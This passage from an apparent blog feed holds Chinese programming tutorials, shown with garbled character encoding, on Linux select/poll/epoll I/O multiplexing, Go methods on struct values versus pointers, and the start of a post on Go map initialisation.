è¿™ä¸ªæ¦‚å¿µï¼ŒåŒ…æ‹¬ä¸Šé¢çš„å‡ ä¸ªå›ç­”ï¼Œ å…¶å®ä¸ç®¡ä½ ç”¨å¤šè¿›ç¨‹è¿˜æ˜¯I/Oå¤šè·¯å¤ç”¨ï¼Œ ç½‘çº¿éƒ½åªæœ‰ä¸€æ ¹å¥½ä¼ã€‚<strong>å¤šä¸ªSockå¤ç”¨ä¸€æ ¹ç½‘çº¿è¿™ä¸ªåŠŸèƒ½æ˜¯åœ¨å†…æ ¸ï¼‹é©±åŠ¨å±‚å®ç°çš„</strong>ã€‚ </p><p>_<br><strong>é‡è¦çš„äº‹æƒ…å†è¯´ä¸€éï¼š I/O multiplexing è¿™é‡Œé¢çš„ multiplexing æŒ‡çš„å…¶å®æ˜¯åœ¨å•ä¸ªçº¿ç¨‹é€šè¿‡è®°å½•è·Ÿè¸ªæ¯ä¸€ä¸ªSock(I/Oæµ)çš„çŠ¶æ€(å¯¹åº”ç©ºç®¡å¡”é‡Œé¢çš„Fight progress stripæ§½)æ¥åŒæ—¶ç®¡ç†å¤šä¸ªI/Oæµ</strong>. å‘æ˜å®ƒçš„åŸå› ï¼Œæ˜¯å°½é‡å¤šçš„æé«˜æœåŠ¡å™¨çš„ååèƒ½åŠ›ã€‚<br>æ˜¯ä¸æ˜¯å¬èµ·æ¥å¥½æ‹—å£ï¼Œçœ‹ä¸ªå›¾å°±æ‡‚äº†.<br><img src="https://snowgo.top/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/3.png"><br>åœ¨åŒä¸€ä¸ªçº¿ç¨‹é‡Œé¢ï¼Œ é€šè¿‡æ‹¨å¼€å…³çš„æ–¹å¼ï¼Œæ¥åŒæ—¶ä¼ è¾“å¤šä¸ªI/Oæµï¼Œ (å­¦è¿‡EEçš„äººç°åœ¨å¯ä»¥ç«™å‡ºæ¥ä¹‰æ­£ä¸¥è¾è¯´è¿™ä¸ªå«â€œ<a href="https://www.zhihu.com/search?q=%E6%97%B6%E5%88%86%E5%A4%8D%E7%94%A8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:55772739%7D">æ—¶åˆ†å¤ç”¨</a>â€äº†ï¼‰ã€‚<br><em>ä»€ä¹ˆï¼Œä½ è¿˜æ²¡æœ‰ææ‡‚â€œä¸€ä¸ªè¯·æ±‚åˆ°æ¥äº†ï¼Œnginxä½¿ç”¨epollæ¥æ”¶è¯·æ±‚çš„è¿‡ç¨‹æ˜¯æ€æ ·çš„â€ï¼Œ å¤šçœ‹çœ‹è¿™ä¸ªå›¾å°±äº†è§£äº†ã€‚æé†’ä¸‹ï¼Œngnixä¼šæœ‰å¾ˆå¤šé“¾æ¥è¿›æ¥ï¼Œ epollä¼šæŠŠä»–ä»¬éƒ½ç›‘è§†èµ·æ¥ï¼Œç„¶ååƒæ‹¨å¼€å…³ä¸€æ ·ï¼Œè°æœ‰æ•°æ®å°±æ‹¨å‘è°ï¼Œç„¶åè°ƒç”¨ç›¸åº”çš„ä»£ç å¤„ç†ã€‚</em><br>äº†è§£è¿™ä¸ªåŸºæœ¬çš„æ¦‚å¿µä»¥åï¼Œå…¶ä»–çš„å°±å¾ˆå¥½è§£é‡Šäº†ã€‚<br>**select, poll, epoll éƒ½æ˜¯I/Oå¤šè·¯å¤ç”¨çš„å…·ä½“çš„å®ç°ï¼Œä¹‹æ‰€ä»¥æœ‰è¿™ä¸‰ä¸ªé¬¼å­˜åœ¨ï¼Œå…¶å®æ˜¯ä»–ä»¬å‡ºç°æ˜¯æœ‰å…ˆåé¡ºåºçš„ã€‚ **</p><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p><strong>select æ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼Œé€šè¿‡å®ƒï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„æ•°ç»„å‘ç»™æ“ä½œç³»ç»Ÿï¼Œ è®©æ“ä½œç³»ç»Ÿå»éå†ï¼Œç¡®å®šå“ªä¸ªæ–‡ä»¶æè¿°ç¬¦å¯ä»¥è¯»å†™ï¼Œ ç„¶åå‘Šè¯‰æˆ‘ä»¬å»å¤„ç†ã€‚</strong></p><ol><li>select è°ƒç”¨éœ€è¦ä¼ å…¥ fd æ•°ç»„ï¼Œéœ€è¦æ‹·è´ä¸€ä»½åˆ°å†…æ ¸ï¼Œé«˜å¹¶å‘åœºæ™¯ä¸‹è¿™æ ·çš„æ‹·è´æ¶ˆè€—çš„èµ„æºæ˜¯æƒŠäººçš„ã€‚ï¼ˆå¯ä¼˜åŒ–ä¸ºä¸å¤åˆ¶ï¼‰</li><li>select åœ¨å†…æ ¸å±‚ä»ç„¶æ˜¯é€šè¿‡éå†çš„æ–¹å¼æ£€æŸ¥æ–‡ä»¶æè¿°ç¬¦çš„å°±ç»ªçŠ¶æ€ï¼Œæ˜¯ä¸ªåŒæ­¥è¿‡ç¨‹ï¼Œåªä¸è¿‡æ— ç³»ç»Ÿè°ƒç”¨åˆ‡æ¢ä¸Šä¸‹æ–‡çš„å¼€é”€ã€‚ï¼ˆå†…æ ¸å±‚å¯ä¼˜åŒ–ä¸ºå¼‚æ­¥äº‹ä»¶é€šçŸ¥ï¼‰</li><li>select ä»…ä»…è¿”å›å¯è¯»æ–‡ä»¶æè¿°ç¬¦çš„ä¸ªæ•°ï¼Œå…·ä½“å“ªä¸ªå¯è¯»è¿˜æ˜¯è¦ç”¨æˆ·è‡ªå·±éå†ã€‚ï¼ˆå¯ä¼˜åŒ–ä¸ºåªè¿”å›ç»™ç”¨æˆ·å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ— éœ€ç”¨æˆ·åšæ— æ•ˆçš„éå†ï¼‰</li></ol><h3 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h3><p>poll ä¹Ÿæ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°ã€‚<br><strong>å®ƒå’Œ select çš„ä¸»è¦åŒºåˆ«å°±æ˜¯ï¼Œå»æ‰äº† select åªèƒ½ç›‘å¬ 1024 ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„é™åˆ¶ã€‚</strong></p><h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><p>epoll æ˜¯æœ€ç»ˆçš„å¤§ bossï¼Œå®ƒè§£å†³äº† select å’Œ poll çš„ä¸€äº›é—®é¢˜ã€‚<br>è¿˜è®°å¾—ä¸Šé¢è¯´çš„ select çš„ä¸‰ä¸ªç»†èŠ‚ä¹ˆï¼Ÿ</p><ol><li> select è°ƒç”¨éœ€è¦ä¼ å…¥ fd æ•°ç»„ï¼Œéœ€è¦æ‹·è´ä¸€ä»½åˆ°å†…æ ¸ï¼Œé«˜å¹¶å‘åœºæ™¯ä¸‹è¿™æ ·çš„æ‹·è´æ¶ˆè€—çš„èµ„æºæ˜¯æƒŠäººçš„ã€‚ï¼ˆå¯ä¼˜åŒ–ä¸ºä¸å¤åˆ¶ï¼‰ </li><li> select åœ¨å†…æ ¸å±‚ä»ç„¶æ˜¯é€šè¿‡éå†çš„æ–¹å¼æ£€æŸ¥æ–‡ä»¶æè¿°ç¬¦çš„å°±ç»ªçŠ¶æ€ï¼Œæ˜¯ä¸ªåŒæ­¥è¿‡ç¨‹ï¼Œåªä¸è¿‡æ— ç³»ç»Ÿè°ƒç”¨åˆ‡æ¢ä¸Šä¸‹æ–‡çš„å¼€é”€ã€‚ï¼ˆå†…æ ¸å±‚å¯ä¼˜åŒ–ä¸ºå¼‚æ­¥äº‹ä»¶é€šçŸ¥ï¼‰ </li><li> select ä»…ä»…è¿”å›å¯è¯»æ–‡ä»¶æè¿°ç¬¦çš„ä¸ªæ•°ï¼Œå…·ä½“å“ªä¸ªå¯è¯»è¿˜æ˜¯è¦ç”¨æˆ·è‡ªå·±éå†ã€‚ï¼ˆå¯ä¼˜åŒ–ä¸ºåªè¿”å›ç»™ç”¨æˆ·å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ— éœ€ç”¨æˆ·åšæ— æ•ˆçš„éå†ï¼‰</li></ol><p>æ‰€ä»¥ epoll ä¸»è¦å°±æ˜¯é’ˆå¯¹è¿™ä¸‰ç‚¹è¿›è¡Œäº†æ”¹è¿›ã€‚ </p><ol><li> å†…æ ¸ä¸­ä¿å­˜ä¸€ä»½æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œæ— éœ€ç”¨æˆ·æ¯æ¬¡éƒ½é‡æ–°ä¼ å…¥ï¼Œåªéœ€å‘Šè¯‰å†…æ ¸ä¿®æ”¹çš„éƒ¨åˆ†å³å¯ã€‚ </li><li> å†…æ ¸ä¸å†é€šè¿‡è½®è¯¢çš„æ–¹å¼æ‰¾åˆ°å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œæ˜¯é€šè¿‡å¼‚æ­¥ IO äº‹ä»¶å”¤é†’ã€‚ </li><li> å†…æ ¸ä»…ä¼šå°†æœ‰ IO äº‹ä»¶çš„æ–‡ä»¶æè¿°ç¬¦è¿”å›ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ä¹Ÿæ— éœ€éå†æ•´ä¸ªæ–‡ä»¶æè¿°ç¬¦é›†åˆã€‚<br>å…·ä½“ï¼Œæ“ä½œç³»ç»Ÿæä¾›äº†è¿™ä¸‰ä¸ªå‡½æ•°ã€‚ </li></ol><p>ç¬¬ä¸€æ­¥ï¼Œåˆ›å»ºä¸€ä¸ª epoll å¥æŸ„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> epoll_create(<span class="keyword">int</span> size);</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥ï¼Œå‘å†…æ ¸æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤è¦ç›‘æ§çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> epoll_ctl(</span><br><span class="line">  <span class="keyword">int</span> epfd, <span class="keyword">int</span> op, <span class="keyword">int</span> fd, <span class="keyword">struct</span> epoll_event *event);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥ï¼Œç±»ä¼¼å‘èµ·äº† select() è°ƒç”¨</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> epoll_wait(</span><br><span class="line">  <span class="keyword">int</span> epfd, <span class="keyword">struct</span> epoll_event *events, <span class="keyword">int</span> max events, <span class="keyword">int</span> timeout);</span><br></pre></td></tr></table></figure><p>è¿‡ç¨‹å±•ç¤ºï¼š<br><img src="https://snowgo.top/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/4.png"><br><img src="https://snowgo.top/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/5.png"></p><p><img src="https://snowgo.top/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/6.png"><br><img src="https://snowgo.top/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/7.png"><br><img src="https://snowgo.top/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/8.png"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><strong>ä¸€åˆ‡çš„å¼€å§‹ï¼Œéƒ½èµ·æºäºè¿™ä¸ª read å‡½æ•°æ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ï¼Œè€Œä¸”æ˜¯é˜»å¡çš„ï¼Œæˆ‘ä»¬å«å®ƒ é˜»å¡ IOã€‚</strong><br><strong>ä¸ºäº†ç ´è¿™ä¸ªå±€ï¼Œç¨‹åºå‘˜åœ¨ç”¨æˆ·æ€é€šè¿‡å¤šçº¿ç¨‹æ¥é˜²æ­¢ä¸»çº¿ç¨‹å¡æ­»ã€‚</strong><br><strong>éé˜»å¡ IOï¼Œä¸èƒ½æ˜¯é€šè¿‡æˆ‘ä»¬ç”¨æˆ·å±‚çš„å°æŠŠæˆï¼Œè€Œæ˜¯è¦æ³è¯·æ“ä½œç³»ç»Ÿä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªéé˜»å¡çš„ read å‡½æ•°ã€‚</strong><br><strong>è¿™ä¸ª read å‡½æ•°çš„æ•ˆæœæ˜¯ï¼Œå¦‚æœæ²¡æœ‰æ•°æ®åˆ°è¾¾æ—¶ï¼ˆåˆ°è¾¾ç½‘å¡å¹¶æ‹·è´åˆ°äº†å†…æ ¸ç¼“å†²åŒºï¼‰ï¼Œç«‹åˆ»è¿”å›ä¸€ä¸ªé”™è¯¯å€¼ï¼ˆ-1ï¼‰ï¼Œè€Œä¸æ˜¯é˜»å¡åœ°ç­‰å¾…ã€‚</strong><br><strong>ä½†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦çš„è¯»å–å°±éœ€è¦éå†ï¼Œå½“é«˜å¹¶å‘åœºæ™¯è¶Šæ¥è¶Šå¤šæ—¶ï¼Œç”¨æˆ·æ€éå†çš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿè¶Šæ¥è¶Šå¤šï¼Œç›¸å½“äºåœ¨ while å¾ªç¯é‡Œè¿›è¡Œäº†è¶Šæ¥è¶Šå¤šçš„ç³»ç»Ÿè°ƒç”¨ã€‚</strong><br><strong>åæ¥æ“ä½œç³»ç»Ÿåˆå‘ç°è¿™ä¸ªåœºæ™¯éœ€æ±‚é‡è¾ƒå¤§ï¼Œäºæ˜¯åˆåœ¨æ“ä½œç³»ç»Ÿå±‚é¢æä¾›äº†è¿™æ ·çš„éå†æ–‡ä»¶æè¿°ç¬¦çš„æœºåˆ¶ï¼Œè¿™å°±æ˜¯ IO å¤šè·¯å¤ç”¨ã€‚</strong><br><strong>å¤šè·¯å¤ç”¨æœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œæœ€å¼€å§‹æ˜¯ selectï¼Œç„¶ååˆå‘æ˜äº† poll è§£å†³äº† select æ–‡ä»¶æè¿°ç¬¦çš„é™åˆ¶ï¼Œç„¶ååˆå‘æ˜äº† epoll è§£å†³ select çš„ä¸‰ä¸ªä¸è¶³ã€‚</strong></p><hr><p>æ‰€ä»¥ï¼ŒIO æ¨¡å‹çš„æ¼”è¿›ï¼Œå…¶å®å°±æ˜¯æ—¶ä»£çš„å˜åŒ–ï¼Œå€’é€¼ç€æ“ä½œç³»ç»Ÿå°†æ›´å¤šçš„åŠŸèƒ½åŠ åˆ°è‡ªå·±çš„å†…æ ¸è€Œå·²ã€‚<br>å¦‚æœä½ å»ºç«‹äº†è¿™æ ·çš„æ€ç»´ï¼Œå¾ˆå®¹æ˜“å‘ç°ç½‘ä¸Šçš„ä¸€äº›é”™è¯¯ã€‚<br>æ¯”å¦‚å¥½å¤šæ–‡ç« è¯´ï¼Œå¤šè·¯å¤ç”¨ä¹‹æ‰€ä»¥æ•ˆç‡é«˜ï¼Œæ˜¯å› ä¸ºç”¨ä¸€ä¸ªçº¿ç¨‹å°±å¯ä»¥ç›‘æ§å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚<br>è¿™æ˜¾ç„¶æ˜¯çŸ¥å…¶ç„¶è€Œä¸çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œå¤šè·¯å¤ç”¨äº§ç”Ÿçš„æ•ˆæœï¼Œå®Œå…¨å¯ä»¥ç”±ç”¨æˆ·æ€å»éå†æ–‡ä»¶æè¿°ç¬¦å¹¶è°ƒç”¨å…¶éé˜»å¡çš„ read å‡½æ•°å®ç°ã€‚è€Œå¤šè·¯å¤ç”¨å¿«çš„åŸå› åœ¨äºï¼Œæ“ä½œç³»ç»Ÿæä¾›äº†è¿™æ ·çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä½¿å¾—åŸæ¥çš„ while å¾ªç¯é‡Œå¤šæ¬¡ç³»ç»Ÿè°ƒç”¨ï¼Œå˜æˆäº†ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ + å†…æ ¸å±‚éå†è¿™äº›æ–‡ä»¶æè¿°ç¬¦ã€‚<br>å°±å¥½æ¯”æˆ‘ä»¬å¹³æ—¶å†™ä¸šåŠ¡ä»£ç ï¼ŒæŠŠåŸæ¥ while å¾ªç¯é‡Œè°ƒ http æ¥å£è¿›è¡Œæ‰¹é‡ï¼Œæ”¹æˆäº†è®©å¯¹æ–¹æä¾›ä¸€ä¸ªæ‰¹é‡æ·»åŠ çš„ http æ¥å£ï¼Œç„¶åæˆ‘ä»¬ä¸€æ¬¡ rpc è¯·æ±‚å°±å®Œæˆäº†æ‰¹é‡æ·»åŠ ã€‚</p><blockquote><p>å‚è€ƒèµ„æ–™<br><a href="https://zhuanlan.zhihu.com/p/446607767">https://zhuanlan.zhihu.com/p/446607767</a><br><a href="https://www.zhihu.com/question/32163005/answer/55772739">https://www.zhihu.com/question/32163005/answer/55772739</a><br><a href="https://mp.weixin.qq.com/s/YdIdoZ_yusVWza1PU7lWaw">https://mp.weixin.qq.com/s/YdIdoZ_yusVWza1PU7lWaw</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goé¢å‘å¯¹è±¡ç¼–ç¨‹</title>
      <link href="/2022/05/07/go%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/05/07/go%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ã€goçš„é¢å‘å¯¹è±¡ï¼Œé€šè¿‡å°†æ–¹æ³•ä¸ç»“æ„ä½“å˜é‡è¿›è¡Œç»‘å®šï¼ˆå½“ç„¶æ–¹æ³•ä¹Ÿå¯ä»¥ä¸å…¶ä»–æ•°æ®ç±»å‹è¿›è¡Œç»‘å®šï¼‰ã€‚<br>func(t T)methodName(å‚æ•°åˆ—è¡¨) (è¿”å›å€¼åˆ—è¡¨){}</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span>&#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Age <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span><span class="title">Say</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(p.Name,<span class="string">&quot;say hello&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p := Person&#123;<span class="string">&quot;Nomen&quot;</span>,<span class="number">18</span>&#125;</span><br><span class="line">p.Say()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºç»“æ„ä½“æ˜¯å€¼æ‹·è´ç±»å‹ï¼Œæ‰€ä»¥è°ƒç”¨æ–¹æ³•çš„æ—¶å€™å°†ä¼šå¤åˆ¶ä¸€ä»½ç»“æ„ä½“å˜é‡çš„æ•°æ®ã€‚æ‰€ä»¥ä¸ºäº†èŠ‚çº¦å¼€é”€ï¼Œç»‘å®šæ–¹æ³•çš„æ–¹å¼å¯ä»¥é€šè¿‡ç»“æ„ä½“å˜é‡æŒ‡é’ˆç»‘å®š<br>func(t *T)methodName(å‚æ•°åˆ—è¡¨) (è¿”å›å€¼åˆ—è¡¨) {}</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span>&#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Age <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span><span class="title">Say</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(p.Name,<span class="string">&quot;say hello&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥æŒ‡é’ˆæ–¹å¼ç»‘å®šç»“æ„ä½“æˆ–è€…ç›´æ¥ç±»å‹ç»‘å®šï¼Œè®¿é—®å±æ€§å€¼å¯ä»¥ç”¨ï¼ˆ&amp;pï¼‰.Name ,goå®˜æ–¹åœ¨åº•å±‚å…¶å®å·²ç»å®ç°äº†å¯ä»¥ç›´æ¥ç”¨p.Name è¿›è¡Œè®¿é—®ã€‚ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼ŒæŒ‡é’ˆç»‘å®šçš„å¯¹è±¡æ˜¯å€¼å¼•ç”¨ï¼Œç›´æ¥ç±»å‹ç»‘å®šçš„æ˜¯å€¼æ‹·è´</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span>&#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Age <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span><span class="title">test1</span><span class="params">()</span></span> &#123;</span><br><span class="line">p.Name = <span class="string">&quot;tom&quot;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;test1&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span><span class="title">test2</span><span class="params">()</span></span> &#123;</span><br><span class="line">p.Name = <span class="string">&quot;jack&quot;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;test2&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p := Person&#123;<span class="string">&quot;Nomen&quot;</span>,<span class="number">18</span>&#125;</span><br><span class="line">(&amp;p).test1()</span><br><span class="line">p.test1()</span><br><span class="line">fmt.Println((&amp;p).Name,p.Name)</span><br><span class="line">(&amp;p).test2()</span><br><span class="line">p.test2()</span><br><span class="line">fmt.Println((&amp;p).Name,p.Name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://snowgo.top/medias/medias/go%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/1.png"></p><p>ç”±æ‰§è¡Œç»“æœå¯ä»¥è¯´æ˜ï¼štest1()  ç›´æ¥ç»‘å®šç±»å‹ï¼ˆå€¼æ‹·è´ï¼‰ï¼Œæ–¹æ³•å†…æ›´æ”¹äº†nameä¸ºtomï¼Œæ–¹æ³•å†…è¾“å‡ºä¸ºtomï¼Œè€Œæ–¹æ³•å¤–ç”¨p.Name ä¾ç„¶æ˜¯åˆå§‹å€¼Nomeã€‚ <strong>è¯´æ˜å¯ç”¨test1æ—¶ï¼Œæ‹·è´äº†ä¸€ä»½Persenã€‚æ“ä½œçš„å†…å­˜ç©ºé—´ä¸åŒäº†</strong>ã€‚æ‰€ä»¥æ–¹æ³•å†…å’Œæ–¹æ³•å¤–çš„ç»“æœä¸åŒ</p><p>test2() ç»‘å®šçš„æ˜¯æŒ‡é’ˆç±»å‹ï¼ˆå€¼å¼•ç”¨ï¼‰ï¼Œæ–¹æ³•å†…æ›´æ”¹Nameä¸ºjackï¼Œæ–¹æ³•å†…è¾“å‡ºä¸ºjackï¼Œæ–¹æ³•å¤–ç”¨p.Nameå·²ç»å°†Nomeæ›´æ”¹ä¸ºjackäº†ã€‚<strong>è¯´æ˜å¯ç”¨test2()æ—¶ï¼Œå¼•ç”¨äº†åˆå§‹çš„Person</strong>ã€‚æ–¹æ³•å†…éƒ¨æ“ä½œçš„å†…å­˜ç©ºé—´è¿˜æ˜¯åŒä¸€ä»½ã€‚æ‰€ä»¥æ–¹æ³•å†…å’Œæ–¹æ³•å¤–çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚</p><p><strong>æ‰€ä»¥æˆ‘ä»¬åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œå¤§éƒ¨åˆ†éƒ½ä¼šç»‘å®šæŒ‡é’ˆç±»å‹ã€‚æ—¢èŠ‚çœäº†èµ„æºï¼ŒåˆåŒæ­¥äº†å¯¹è±¡çš„æ•°æ®ã€‚</strong></p><p>äºŒã€æ–¹æ³•çš„è®¿é—®é™å®šä¸æ–¹æ³•åé¦–å­—æ¯æ˜¯å¦å¤§å°å†™æœ‰å…³ï¼Œä¸å±æ€§è®¿é—®é™å®šä¸€æ ·ã€‚é¦–å­—æ¯å¤§å†™ï¼ŒåŒ…å¤–å¯ä»¥è®¿é—®ï¼Œå°å†™åˆ™åªèƒ½åœ¨åŒ…å†…è®¿é—®ã€‚</p><p>ä¸‰ã€å¦‚æœä¸€ä¸ªç±»å‹å®ç°äº†String()æ–¹æ³•ï¼Œé‚£ä¹ˆfmt.Println()è¿›è¡Œæ‰“å°çš„æ—¶å€™å°±ä¼šé»˜è®¤è°ƒç”¨å˜é‡å®ç°çš„è¿™ä¸ªString()æ–¹æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Goè¯­è¨€mapå£°æ˜å’Œåˆå§‹åŒ–å°ç»“</title>
      <link href="/2022/05/06/Go%E8%AF%AD%E8%A8%80map%E5%A3%B0%E6%98%8E%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E5%B0%8F%E7%BB%93/"/>
      <url>/2022/05/06/Go%E8%AF%AD%E8%A8%80map%E5%A3%B0%E6%98%8E%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>mapçš„å£°æ˜å’Œåˆå§‹åŒ–æ–¹æ³•æœ‰ä¸¤ç§, ç›´æ¥åˆå§‹åŒ–å’Œä½¿ç”¨makeï¼Œå¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m1 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span> = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line"><span class="keyword">var</span> m8 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span> = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¬¬ä¸€éƒ¨åˆ†-æè¿°"><a href="#ç¬¬ä¸€éƒ¨åˆ†-æè¿°" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† æè¿°"></a>ç¬¬ä¸€éƒ¨åˆ† 